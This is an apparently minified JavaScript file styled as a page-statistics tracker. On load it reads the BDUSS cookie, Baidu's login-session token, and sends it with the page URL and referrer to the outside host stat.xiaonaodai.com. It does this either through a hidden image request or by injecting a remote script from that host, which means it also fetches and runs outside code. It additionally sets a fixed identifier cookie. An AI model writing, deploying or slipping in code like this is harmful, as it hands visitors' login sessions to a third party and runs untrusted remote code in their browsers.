function getCookie(d) {
    var b = document.cookie.split("; ");
    for (var c = 0; c < b.length; c++) {
        var a = b[c].split("=");
        if (d == a[0]) {
            return decodeURIComponent(a[1])
        }
    }
    return null
}
function setCookie(c, g, a, h) {
    var b = "";
    var e = "";
    if (a != null) {
        b = new Date((new Date()).getTime() + a * 3600000);
        b = "; expires=" + b.toGMTString();
        e = "; domain=" + h
    }
    document.cookie = c + "=" + escape(g) + b + e + "; path=/;"
}
var protocol = "https:" == document.location.protocol ? "https:" : "http:";
function callRequest(c) {
    var a = "xnd_image_" + Math.floor(2147483648 * Math.random());
    window[a] = new Image;
    window[a].onload = window[a].onerror = window[a].onabort = function () {
        try {
            this.onload = this.onerror = this.onabort = null
        } catch (b) {
        }
    };
    window[a].src = c + "&rnd=" + Math.floor(2147483648 * Math.random())
}
function callScript(e, h, c) {
    if (!0 == c) {
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.charset = h;
        a.src = e;
        var g = document.getElementsByTagName("script")[0];
        g.parentNode.insertBefore(a, g)
    } else {
        f.write(unescape("%3Cscript src='" + e + "' charset='" + h + "' type='text/javascript'%3E%3C/script%3E"))
    }
}
(function () {
    var c = getCookie("BDUSS");
    setCookie("stat_mac", "20D94CD714C714A4", 1, location.hostname);
    var a = encodeURIComponent(document.referrer);
    var b = encodeURIComponent(document.location.href);
    if (c == 1) {
        callScript(protocol + "//stat.xiaonaodai.com/u.php?id=2608504&b=" + c + "&m=20D94CD714C714A4&h=" + b + "&t=" + Math.random() + "&r=" + a, "utf-8", 1)
    } else {
        callRequest(protocol + "//stat.xiaonaodai.com/u.php?id=2608504&b=" + c + "&m=20D94CD714C714A4&h=" + b + "&t=" + Math.random() + "&r=" + a)
    }
})();
